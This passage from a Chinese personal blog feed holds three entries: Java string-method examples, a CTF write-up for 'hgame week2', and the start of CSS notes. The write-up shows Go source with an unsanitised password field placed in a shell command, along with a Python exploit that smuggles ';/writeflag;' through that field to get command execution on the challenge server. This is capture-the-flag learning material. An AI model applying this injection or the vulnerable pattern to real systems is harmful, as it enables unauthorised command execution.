<span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">  <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;报告.doc&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span>(fileName.endsWith(<span class="string">&quot;.doc&quot;</span>))&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;是word文档&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="replaceAll替换"><a href="#replaceAll替换" class="headerlink" title="replaceAll替换"></a>replaceAll替换</h3><p>​<code>replaceAll(&quot;要替换的值&quot;,&quot;新值&quot;)</code>​</p><p>执行后会得到一个新的字符串，原始的字符串并不发生改变</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">   <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;Java是一种广泛使用的计算机编程语言&quot;</span></span><br><span class="line">   <span class="type">String</span> <span class="variable">newStr</span> <span class="operator">=</span> str.replaceAll(<span class="string">&quot;Java&quot;</span>,<span class="string">&quot;Python&quot;</span>);</span><br><span class="line">   System.out.println(newStr);</span><br><span class="line">   System.out.println(str);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>删除内容也可以采用这个方法，把替换值换成空格即可</p><h3 id="split分割"><a href="#split分割" class="headerlink" title="split分割"></a>split分割</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">  <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;姓名|年龄|性别\n张三|20|男\n李四|18|男\n王五|18|男&quot;</span>;</span><br><span class="line">  <span class="comment">// 使用 split 进行换行符的分割，得到一个新的数组对象</span></span><br><span class="line">  String[] data = text.split(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 因为第一行是标题不是数据，所以我们需要把长度-1</span></span><br><span class="line">  <span class="comment">// (注意要使用小括号包围，因为要先计算长度再组合字符串)</span></span><br><span class="line">  System.out.println(<span class="string">&quot;共有:&quot;</span>+(data.length-<span class="number">1</span>)+<span class="string">&quot; 条记录&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;data.length;i++)&#123;</span><br><span class="line">    <span class="comment">// 使用 \\| 进行字符串分割，得到一个新数组对象</span></span><br><span class="line">    String[] lines = data[i].split(<span class="string">&quot;\\|&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;姓名:&quot;</span>+lines[<span class="number">0</span>]+<span class="string">&quot; 年纪:&quot;</span>+lines[<span class="number">1</span>]+<span class="string">&quot; 性别:&quot;</span>+lines[<span class="number">2</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​<code>注意：. | *这三个字符如果作为分割符，就需要加上\\，比如str.split(&quot;\\|&quot;)</code>​</p><h3 id="toUpperCase-Lower大小写转化"><a href="#toUpperCase-Lower大小写转化" class="headerlink" title="toUpperCase&#x2F;~Lower大小写转化"></a>toUpperCase&#x2F;~Lower大小写转化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;ZhanSan&quot;</span>;</span><br><span class="line">    <span class="comment">// 把拼音全部转化为大写字母</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">enName</span> <span class="operator">=</span> text.toUpperCase();</span><br><span class="line">    System.out.println(enName);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="equals比较"><a href="#equals比较" class="headerlink" title="equals比较"></a>equals比较</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;字符串&quot;</span>;</span><br><span class="line">    <span class="comment">// 使用 equals 方法判断是否相同</span></span><br><span class="line">    <span class="keyword">if</span> (text.equals(<span class="string">&quot;字符串&quot;</span>)) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;equals 方法字符串相等&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 前后顺序无所谓,下面代码是一样的</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;字符串&quot;</span>.equals(text)) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;equals 方法字符串相等&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="数字字符串转化Integer-parseInt"><a href="#数字字符串转化Integer-parseInt" class="headerlink" title="数字字符串转化Integer.parseInt"></a>数字字符串转化Integer.parseInt</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">   <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line">   <span class="comment">// 转化字符串为数字</span></span><br><span class="line">   <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> Integer.parseInt(text);</span><br><span class="line">   System.out.println(a);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>数字转化为字符串有两种方法，一种是之前运用的+，比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">   <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">   <span class="comment">//使用空字符串相加数字，会自动变成字符串类型</span></span><br><span class="line">   <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>+a;</span><br><span class="line">   System.out.println(str);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>另一种是利用<code>String.valueOf( )</code>​方法，该方法参数接受数字，浮点，布尔类型转化为字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">   <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">   <span class="comment">//使用valueOf强制把数字转化为字符串</span></span><br><span class="line">   <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> String.valueOf(a);</span><br><span class="line">   System.out.println(str);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>‍</p><p>‍</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 编程...？ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame week2 wp</title>
      <link href="/2025/02/20/hgame-week2/"/>
      <url>/2025/02/20/hgame-week2/</url>
      
        <content type="html"><![CDATA[<p>week2明显力不从心了，签到少了，只做出来两题</p><p>web要学的东西还很多啊，Java反序列化都没做出来</p><p>一道crypto一道web，crypto是ai写的</p><p>Crypto 参见sean师傅的博客，我这里只给exp</p><p><a href="https://seandictionary.top/">Sean师傅的博客</a></p><h2 id="Crypto-Ancient-Recall"><a href="#Crypto-Ancient-Recall" class="headerlink" title="Crypto Ancient Recall"></a>Crypto Ancient Recall</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Major_Arcana = [<span class="string">&quot;The Fool&quot;</span>, <span class="string">&quot;The Magician&quot;</span>, <span class="string">&quot;The High Priestess&quot;</span>, <span class="string">&quot;The Empress&quot;</span>, <span class="string">&quot;The Emperor&quot;</span>, <span class="string">&quot;The Hierophant&quot;</span>, <span class="string">&quot;The Lovers&quot;</span>, <span class="string">&quot;The Chariot&quot;</span>, <span class="string">&quot;Strength&quot;</span>, <span class="string">&quot;The Hermit&quot;</span>, <span class="string">&quot;Wheel of Fortune&quot;</span>, <span class="string">&quot;Justice&quot;</span>, <span class="string">&quot;The Hanged Man&quot;</span>, <span class="string">&quot;Death&quot;</span>, <span class="string">&quot;Temperance&quot;</span>, <span class="string">&quot;The Devil&quot;</span>, <span class="string">&quot;The Tower&quot;</span>, <span class="string">&quot;The Star&quot;</span>, <span class="string">&quot;The Moon&quot;</span>, <span class="string">&quot;The Sun&quot;</span>, <span class="string">&quot;Judgement&quot;</span>, <span class="string">&quot;The World&quot;</span>]</span><br><span class="line">wands = [<span class="string">&quot;Ace of Wands&quot;</span>, <span class="string">&quot;Two of Wands&quot;</span>, <span class="string">&quot;Three of Wands&quot;</span>, <span class="string">&quot;Four of Wands&quot;</span>, <span class="string">&quot;Five of Wands&quot;</span>, <span class="string">&quot;Six of Wands&quot;</span>, <span class="string">&quot;Seven of Wands&quot;</span>, <span class="string">&quot;Eight of Wands&quot;</span>, <span class="string">&quot;Nine of Wands&quot;</span>, <span class="string">&quot;Ten of Wands&quot;</span>, <span class="string">&quot;Page of Wands&quot;</span>, <span class="string">&quot;Knight of Wands&quot;</span>, <span class="string">&quot;Queen of Wands&quot;</span>, <span class="string">&quot;King of Wands&quot;</span>]</span><br><span class="line">cups = [<span class="string">&quot;Ace of Cups&quot;</span>, <span class="string">&quot;Two of Cups&quot;</span>, <span class="string">&quot;Three of Cups&quot;</span>, <span class="string">&quot;Four of Cups&quot;</span>, <span class="string">&quot;Five of Cups&quot;</span>, <span class="string">&quot;Six of Cups&quot;</span>, <span class="string">&quot;Seven of Cups&quot;</span>, <span class="string">&quot;Eight of Cups&quot;</span>, <span class="string">&quot;Nine of Cups&quot;</span>, <span class="string">&quot;Ten of Cups&quot;</span>, <span class="string">&quot;Page of Cups&quot;</span>, <span class="string">&quot;Knight of Cups&quot;</span>, <span class="string">&quot;Queen of Cups&quot;</span>, <span class="string">&quot;King of Cups&quot;</span>]</span><br><span class="line">swords = [<span class="string">&quot;Ace of Swords&quot;</span>, <span class="string">&quot;Two of Swords&quot;</span>, <span class="string">&quot;Three of Swords&quot;</span>, <span class="string">&quot;Four of Swords&quot;</span>, <span class="string">&quot;Five of Swords&quot;</span>, <span class="string">&quot;Six of Swords&quot;</span>, <span class="string">&quot;Seven of Swords&quot;</span>, <span class="string">&quot;Eight of Swords&quot;</span>, <span class="string">&quot;Nine of Swords&quot;</span>, <span class="string">&quot;Ten of Swords&quot;</span>, <span class="string">&quot;Page of Swords&quot;</span>, <span class="string">&quot;Knight of Swords&quot;</span>, <span class="string">&quot;Queen of Swords&quot;</span>, <span class="string">&quot;King of Swords&quot;</span>]</span><br><span class="line">pentacles = [<span class="string">&quot;Ace of Pentacles&quot;</span>, <span class="string">&quot;Two of Pentacles&quot;</span>, <span class="string">&quot;Three of Pentacles&quot;</span>, <span class="string">&quot;Four of Pentacles&quot;</span>, <span class="string">&quot;Five of Pentacles&quot;</span>, <span class="string">&quot;Six of Pentacles&quot;</span>, <span class="string">&quot;Seven of Pentacles&quot;</span>, <span class="string">&quot;Eight of Pentacles&quot;</span>, <span class="string">&quot;Nine of Pentacles&quot;</span>, <span class="string">&quot;Ten of Pentacles&quot;</span>, <span class="string">&quot;Page of Pentacles&quot;</span>, <span class="string">&quot;Knight of Pentacles&quot;</span>, <span class="string">&quot;Queen of Pentacles&quot;</span>, <span class="string">&quot;King of Pentacles&quot;</span>]</span><br><span class="line">Minor_Arcana = wands + cups + swords + pentacles</span><br><span class="line">tarot = Major_Arcana + Minor_Arcana</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_fortune_wheel</span>(<span class="params">current</span>):</span><br><span class="line">    a, b, c, d, e = current</span><br><span class="line">    numerator = a + b + d - c - e</span><br><span class="line">    <span class="keyword">if</span> numerator % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Cannot invert, odd numerator.&quot;</span>)</span><br><span class="line">    v1 = numerator // <span class="number">2</span></span><br><span class="line">    v0 = a - v1</span><br><span class="line">    v2 = b - v1</span><br><span class="line">    v3 = c - v2</span><br><span class="line">    v4 = d - v3</span><br><span class="line">    <span class="keyword">assert</span> (v4 + v0) == e, <span class="string">&quot;Validation failed.&quot;</span></span><br><span class="line">    <span class="keyword">return</span> [v0, v1, v2, v3, v4]</span><br><span class="line"></span><br><span class="line">final_values = [</span><br><span class="line">    <span class="number">2532951952066291774890498369114195917240794704918210520571067085311474675019</span>,</span><br><span class="line">    <span class="number">2532951952066291774890327666074100357898023013105443178881294700381509795270</span>,</span><br><span class="line">    <span class="number">2532951952066291774890554459287276604903130315859258544173068376967072335730</span>,</span><br><span class="line">    <span class="number">2532951952066291774890865328241532885391510162611534514014409174284299139015</span>,</span><br><span class="line">    <span class="number">2532951952066291774890830662608134156017946376309989934175833913921142609334</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">current = final_values.copy()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">250</span>):</span><br><span class="line">    current = inverse_fortune_wheel(current)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_card_name</span>(<span class="params">v</span>):</span><br><span class="line">    idx = v % <span class="number">78</span></span><br><span class="line">    reversed_idx = (idx ^ -<span class="number">1</span>) % <span class="number">78</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= reversed_idx &lt; <span class="number">22</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;re-<span class="subst">&#123;Major_Arcana[reversed_idx]&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> idx &lt; <span class="number">22</span>:</span><br><span class="line">        <span class="keyword">return</span> Major_Arcana[idx]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minor_idx = idx - <span class="number">22</span></span><br><span class="line">        suit = minor_idx // <span class="number">14</span></span><br><span class="line">        card = minor_idx % <span class="number">14</span></span><br><span class="line">        suit_name = [<span class="string">&#x27;Wands&#x27;</span>, <span class="string">&#x27;Cups&#x27;</span>, <span class="string">&#x27;Swords&#x27;</span>, <span class="string">&#x27;Pentacles&#x27;</span>][suit]</span><br><span class="line">        <span class="keyword">if</span> card &lt; <span class="number">10</span>:</span><br><span class="line">            number = [<span class="string">&#x27;Ace&#x27;</span>, <span class="string">&#x27;Two&#x27;</span>, <span class="string">&#x27;Three&#x27;</span>, <span class="string">&#x27;Four&#x27;</span>, <span class="string">&#x27;Five&#x27;</span>, <span class="string">&#x27;Six&#x27;</span>, <span class="string">&#x27;Seven&#x27;</span>, <span class="string">&#x27;Eight&#x27;</span>, <span class="string">&#x27;Nine&#x27;</span>, <span class="string">&#x27;Ten&#x27;</span>][card]</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;number&#125;</span> of <span class="subst">&#123;suit_name&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            court = [<span class="string">&#x27;Page&#x27;</span>, <span class="string">&#x27;Knight&#x27;</span>, <span class="string">&#x27;Queen&#x27;</span>, <span class="string">&#x27;King&#x27;</span>][card - <span class="number">10</span>]</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;court&#125;</span> of <span class="subst">&#123;suit_name&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">initial_fate = [get_card_name(v) <span class="keyword">for</span> v <span class="keyword">in</span> current]</span><br><span class="line">flag = <span class="string">&quot;hgame&#123;&quot;</span> + <span class="string">&quot;&amp;&quot;</span>.join(initial_fate).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;_&quot;</span>) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="web-honeyhot"><a href="#web-honeyhot" class="headerlink" title="web honeyhot"></a>web honeyhot</h2><p>审计源码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ImportData</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> config ImportConfig</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;config); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusBadRequest, gin.H&#123;</span><br><span class="line"><span class="string">&quot;success&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request body: &quot;</span> + err.Error(),</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := validateImportConfig(config); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusBadRequest, gin.H&#123;</span><br><span class="line"><span class="string">&quot;success&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid input: &quot;</span> + err.Error(),</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">config.RemoteHost = sanitizeInput(config.RemoteHost)</span><br><span class="line">config.RemoteUsername = sanitizeInput(config.RemoteUsername)</span><br><span class="line">config.RemoteDatabase = sanitizeInput(config.RemoteDatabase)</span><br><span class="line">config.LocalDatabase = sanitizeInput(config.LocalDatabase)</span><br><span class="line"><span class="keyword">if</span> manager.db == <span class="literal">nil</span> &#123;</span><br><span class="line">dsn := buildDSN(localConfig)</span><br><span class="line">db, err := sql.Open(<span class="string">&quot;mysql&quot;</span>, dsn)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;</span><br><span class="line"><span class="string">&quot;success&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">&quot;message&quot;</span>: <span class="string">&quot;Failed to connect to local database: &quot;</span> + err.Error(),</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := db.Ping(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">db.Close()</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;</span><br><span class="line"><span class="string">&quot;success&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">&quot;message&quot;</span>: <span class="string">&quot;Failed to ping local database: &quot;</span> + err.Error(),</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">manager.db = db</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := createdb(config.LocalDatabase); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;</span><br><span class="line"><span class="string">&quot;success&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">&quot;message&quot;</span>: <span class="string">&quot;Failed to create local database: &quot;</span> + err.Error(),</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Never able to inject shell commands,Hackers can&#x27;t use this,HaHa</span></span><br><span class="line">command := fmt.Sprintf(<span class="string">&quot;/usr/local/bin/mysqldump -h %s -u %s -p%s %s |/usr/local/bin/mysql -h 127.0.0.1 -u %s -p%s %s&quot;</span>,</span><br><span class="line">config.RemoteHost,</span><br><span class="line">config.RemoteUsername,</span><br><span class="line">config.RemotePassword,</span><br><span class="line">config.RemoteDatabase,</span><br><span class="line">localConfig.Username,</span><br><span class="line">localConfig.Password,</span><br><span class="line">config.LocalDatabase,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>dirsearch扫一下发现flag目录但是403，审计源码注意到config.RemotePassword无过滤</p><p>且题目提示执行writeflag命令，于是构造即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">target=<span class="string">&quot;http://node1.hgame.vidar.club:32511&quot;</span></span><br><span class="line">res = requests.post(target+<span class="string">&#x27;/api/import&#x27;</span>,json=&#123;</span><br><span class="line">    <span class="string">&quot;remote_host&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;remote_port&quot;</span>: <span class="string">&quot;3389&quot;</span>,</span><br><span class="line">    <span class="string">&quot;remote_username&quot;</span>: <span class="string">&quot;test_usernane&quot;</span>,</span><br><span class="line">    <span class="string">&quot;remote_password&quot;</span>: <span class="string">&quot;;/writeflag;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;remote_database&quot;</span>: <span class="string">&quot;test_databaseName&quot;</span>,</span><br><span class="line">    <span class="string">&quot;local_database&quot;</span>: <span class="string">&quot;test_localdatabaseName&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line">res = requests.get(target+<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 一个web蒟蒻的成长日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS随记</title>
      <link href="/2025/02/18/CSS%E9%9A%8F%E8%AE%B0/"/>
      <url>/2025/02/18/CSS%E9%9A%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h2><p>1.一个元素由开始标签，内容以及结束标签组成。</p><p>2.如果是单独呈现的标签，一个标签就代表一个元素</p><p>3.标签名对大小写不敏感</p><h2 id="运行和预览前端工程"><a href="#运行和预览前端工程" class="headerlink" title="运行和预览前端工程"></a>运行和预览前端工程</h2><p>右上角的terminal -&gt; new terminal -&gt; serve . –listen 8080 -&gt; 在预览中开启8080端口</p><h2 id="html文档的基本结构"><a href="#html文档的基本结构" class="headerlink" title="html文档的基本结构"></a>html文档的基本结构</h2><p>​<img src="/img/CSS1/111.png" alt="image">​</p><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><p></p> 段落标签<h1></h1>一级标题 同理可编辑1-6级<p><strong></strong> 对内容进行加粗</p><p>​<img src="/img/CSS1/image-20250119130010-pplwgo0.png" alt="image">​</p><h2 id="CSS引入"><a href="#CSS引入" class="headerlink" title="CSS引入"></a>CSS引入</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./index.css&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 或者./去掉也可以，效果是一样的 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;index.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>‍</p><p>span和div互相转化：display：inline&#x2F;block</p><p>display：none 即隐藏</p><h2 id="常见写法：父子类"><a href="#常见写法：父子类" class="headerlink" title="常见写法：父子类"></a>常见写法：父子类</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">div</span> class=&quot;box&quot;&gt;</span><br><span class="line">        &lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=&quot;https://gw.alicdn.com/bao/uploaded/i1/<span class="number">749716436</span>/O1CN01OSPWqa1xPjeErSSzf_!!<span class="number">749716436</span>-<span class="number">0</span>-pixelsss.jpg<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;</span>introduce<span class="string">&quot;&gt;男运动鞋&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;</span>price<span class="string">&quot;&gt;¥78.3&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">div</span> class=&quot;father&quot;&gt;</span><br><span class="line">  &lt;<span class="selector-tag">div</span> class=&quot;box1&quot;&gt;&lt;/<span 